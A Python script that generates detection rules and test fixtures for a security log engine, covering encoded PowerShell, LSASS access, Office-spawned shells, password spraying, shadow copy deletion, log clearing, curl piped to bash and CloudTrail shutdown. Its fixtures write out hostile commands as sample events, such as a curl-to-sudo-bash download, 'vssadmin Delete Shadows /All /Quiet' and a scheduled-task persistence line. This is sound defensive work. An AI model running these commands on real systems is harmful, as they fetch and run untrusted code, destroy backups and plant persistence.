"""Generate rules/*.json and tests/fixtures/*.json.

Keeping the rules in Python while drafting makes it easy to review regexes in one place.
The JSON files are the source of truth that the engine and CI consume.
Paths are written with '/' here and turned into Windows '\\' paths by w().
"""
import json
import pathlib

ROOT = pathlib.Path(__file__).resolve().parents[1]


def w(*paths: str) -> list[str]:
    return [p.replace("/", "\\") for p in paths]


def wp(p: str) -> str:
    return p.replace("/", "\\")


WIN = {"product": "windows"}
PS = wp("C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe")
ENC = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"

RULES = [
    {"id": "DET-001", "title": "Encoded PowerShell command line", "level": "high",
     "attack": ["T1059.001", "T1027"], "logsource": {**WIN, "EventID": 1},
     "selection": {"Image|endswith": w("/powershell.exe", "/pwsh.exe"),
                   "CommandLine|re": [r"\s-e(nc|ncodedcommand)?\s+[a-z0-9+/=]{20,}"]},
     "filter": {"ParentImage|endswith": w("/ccmexec.exe")},
     "falsepositives": ["Management agents (add to filter)"]},
    {"id": "DET-002", "title": "LSASS memory access by unexpected process", "level": "critical",
     "attack": ["T1003.001"], "logsource": {**WIN, "EventID": 10},
     "selection": {"TargetImage|endswith": w("/lsass.exe"),
                   "GrantedAccess": ["0x1010", "0x1410", "0x1fffff", "0x1438"]},
     "filter": {"SourceImage|endswith": w("/msmpeng.exe", "/wininit.exe", "/csrss.exe")},
     "falsepositives": ["EDR / AV products not yet in filter"]},
    {"id": "DET-003", "title": "Office application spawning a shell", "level": "high",
     "attack": ["T1566.001", "T1204.002"], "logsource": {**WIN, "EventID": 1},
     "selection": {"ParentImage|endswith": w("/winword.exe", "/excel.exe", "/powerpnt.exe", "/outlook.exe"),
                   "Image|endswith": w("/cmd.exe", "/powershell.exe", "/wscript.exe", "/mshta.exe", "/rundll32.exe")},
     "falsepositives": ["Legacy macros in finance workflows"]},
    {"id": "DET-004", "title": "Password spraying / brute force from one source", "level": "medium",
     "attack": ["T1110.001", "T1110.003"], "logsource": {**WIN, "EventID": 4625},
     "selection": {"LogonType": [3, 10]},
     "threshold": {"count": 5, "window_s": 60, "group_by": "IpAddress"},
     "falsepositives": ["Service account with a stale password"]},
    {"id": "DET-005", "title": "Scheduled task created from command line", "level": "medium",
     "attack": ["T1053.005"], "logsource": {**WIN, "EventID": 1},
     "selection": {"Image|endswith": w("/schtasks.exe"), "CommandLine|contains": ["/create"]},
     "filter": {"ParentImage|endswith": w("/msiexec.exe")},
     "falsepositives": ["Software installers"]},
    {"id": "DET-006", "title": "Shadow copy / backup catalog deletion", "level": "critical",
     "attack": ["T1490"], "logsource": {**WIN, "EventID": 1},
     "selection": {"CommandLine|re": [r"vssadmin(\.exe)?\s+delete\s+shadows",
                                      r"wmic(\.exe)?\s+shadowcopy\s+delete",
                                      r"wbadmin(\.exe)?\s+delete\s+catalog"]},
     "falsepositives": ["Rare backup maintenance"]},
    {"id": "DET-007", "title": "Security event log cleared", "level": "high",
     "attack": ["T1070.001"], "logsource": {**WIN, "EventID": 1102},
     "selection": {"Channel": ["Security"]},
     "falsepositives": ["Documented admin log rotation"]},
    {"id": "DET-008", "title": "Remote script piped directly to a shell", "level": "high",
     "attack": ["T1105", "T1059.004"], "logsource": {"product": "linux", "EventID": "execve"},
     "selection": {"CommandLine|re": [r"(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b"]},
     "falsepositives": ["Developer installers (allowlist known URLs)"]},
    {"id": "DET-009", "title": "CloudTrail logging stopped or deleted", "level": "critical",
     "attack": ["T1562.008"], "logsource": {"product": "aws"},
     "selection": {"eventSource": ["cloudtrail.amazonaws.com"],
                   "eventName": ["StopLogging", "DeleteTrail", "UpdateTrail", "PutEventSelectors"]},
     "falsepositives": ["Change-managed trail reconfiguration"]},
]


def ev(t: str, **kw) -> dict:
    return {"UtcTime": f"2026-10-30T10:{t}Z", **kw}


P1 = {**WIN, "EventID": 1}
FIXTURES = {
    "DET-001": {
        "tp": [ev("00:01", **P1, Image=PS, ParentImage=wp("C:/Windows/explorer.exe"), CommandLine=ENC)],
        "tn": [ev("00:02", **P1, Image=PS, ParentImage=wp("C:/Windows/explorer.exe"),
                  CommandLine="powershell.exe -File " + wp("C:/scripts/backup.ps1") + " -Environment prod"),
               ev("00:03", **P1, Image=PS, ParentImage=wp("C:/Windows/CCM/CcmExec.exe"), CommandLine=ENC)]},
    "DET-002": {
        "tp": [ev("01:00", **WIN, EventID=10, SourceImage=wp("C:/Users/bob/AppData/Local/Temp/x.exe"),
                  TargetImage=wp("C:/Windows/System32/lsass.exe"), GrantedAccess="0x1010")],
        "tn": [ev("01:01", **WIN, EventID=10, SourceImage=wp("C:/ProgramData/Microsoft/Windows Defender/MsMpEng.exe"),
                  TargetImage=wp("C:/Windows/System32/lsass.exe"), GrantedAccess="0x1010"),
               ev("01:02", **WIN, EventID=10, SourceImage=wp("C:/Windows/explorer.exe"),
                  TargetImage=wp("C:/Windows/System32/lsass.exe"), GrantedAccess="0x1000")]},
    "DET-003": {
        "tp": [ev("02:00", **P1, ParentImage=wp("C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE"),
                  Image=wp("C:/Windows/System32/cmd.exe"), CommandLine="cmd /c whoami")],
        "tn": [ev("02:01", **P1, ParentImage=wp("C:/Windows/explorer.exe"),
                  Image=wp("C:/Windows/System32/cmd.exe"), CommandLine="cmd")]},
    "DET-004": {
        "tp": [ev(f"03:{i:02d}", **WIN, EventID=4625, LogonType=3, IpAddress="203.0.113.50",
                  TargetUserName=f"user{i}") for i in range(0, 30, 5)],
        "tn": [ev(f"03:{i:02d}", **WIN, EventID=4625, LogonType=3, IpAddress="10.0.0.7",
                  TargetUserName="alice") for i in (0, 40)]
              + [ev(f"{4 + i:02d}:00", **WIN, EventID=4625, LogonType=3, IpAddress="198.51.100.9",
                    TargetUserName="x") for i in range(5)]},
    "DET-005": {
        "tp": [ev("05:00", **P1, Image=wp("C:/Windows/System32/schtasks.exe"),
                  ParentImage=wp("C:/Windows/System32/cmd.exe"),
                  CommandLine="schtasks /create /sc minute /tn upd /tr " + wp("C:/Users/Public/u.exe"))],
        "tn": [ev("05:01", **P1, Image=wp("C:/Windows/System32/schtasks.exe"),
                  ParentImage=wp("C:/Windows/System32/msiexec.exe"), CommandLine="schtasks /create /tn Updater"),
               ev("05:02", **P1, Image=wp("C:/Windows/System32/schtasks.exe"),
                  ParentImage=wp("C:/Windows/System32/cmd.exe"), CommandLine="schtasks /query")]},
    "DET-006": {
        "tp": [ev("06:00", **P1, Image=wp("C:/Windows/System32/vssadmin.exe"),
                  CommandLine="vssadmin.exe Delete Shadows /All /Quiet")],
        "tn": [ev("06:01", **P1, Image=wp("C:/Windows/System32/vssadmin.exe"), CommandLine="vssadmin list shadows")]},
    "DET-007": {
        "tp": [ev("07:00", **WIN, EventID=1102, Channel="Security", SubjectUserName="eve")],
        "tn": [ev("07:01", **WIN, EventID=104, Channel="System")]},
    "DET-008": {
        "tp": [ev("08:00", product="linux", EventID="execve",
                  CommandLine="curl -fsSL http://203.0.113.9/i.sh | sudo bash")],
        "tn": [ev("08:01", product="linux", EventID="execve", CommandLine="curl -o report.csv https://intranet/report"),
               ev("08:02", product="linux", EventID="execve", CommandLine="cat notes | grep curl")]},
    "DET-009": {
        "tp": [ev("09:00", product="aws", eventSource="cloudtrail.amazonaws.com", eventName="StopLogging",
                  sourceIPAddress="198.51.100.4")],
        "tn": [ev("09:01", product="aws", eventSource="cloudtrail.amazonaws.com", eventName="DescribeTrails"),
               ev("09:02", product="aws", eventSource="s3.amazonaws.com", eventName="DeleteBucket")]},
}


def dump(path: pathlib.Path, obj) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(obj, indent=2) + "\n", encoding="utf-8", newline="\n")


def main() -> None:
    for r in RULES:
        dump(ROOT / "rules" / f"{r['id']}.json", r)
    for rid, fx in FIXTURES.items():
        dump(ROOT / "tests" / "fixtures" / f"{rid}.json", fx)
    # Simulated intrusion day: every true positive, every true negative, plus benign noise
    day = [e for fx in FIXTURES.values() for e in fx["tp"] + fx["tn"]]
    day += [ev(f"{m:02d}:30", **P1, Image=wp("C:/Windows/System32/notepad.exe"),
               ParentImage=wp("C:/Windows/explorer.exe"), CommandLine="notepad.exe") for m in range(10)]
    (ROOT / "data").mkdir(exist_ok=True)
    with (ROOT / "data" / "intrusion-day.jsonl").open("w", encoding="utf-8", newline="\n") as fh:
        for e in day:
            fh.write(json.dumps(e) + "\n")
    print(f"{len(RULES)} rules, {len(FIXTURES)} fixtures, {len(day)} events")


if __name__ == "__main__":
    main()
